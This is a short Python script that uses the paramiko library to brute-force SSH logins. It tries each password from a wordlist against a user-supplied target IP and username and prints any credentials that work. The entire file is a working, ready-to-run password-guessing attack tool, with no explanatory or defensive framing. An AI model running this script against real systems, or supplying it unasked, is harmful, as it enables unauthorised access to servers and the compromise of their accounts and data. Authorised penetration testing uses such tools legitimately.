import paramiko

def ssh_bruteforce(ip, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        try:
            client.connect(ip, username=username, password=password, timeout=3)
            print(f"[+] Found credentials: {username}:{password}")
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {username}:{password}")
        except Exception as e:
            print(f"Error: {e}")
    
    print("[!] No valid credentials found.")

if __name__ == "__main__":
    target_ip = input("Target IP: ")
    username = input("Username: ")
    password_file = input("Password file: ")
    ssh_bruteforce(target_ip, username, password_file)
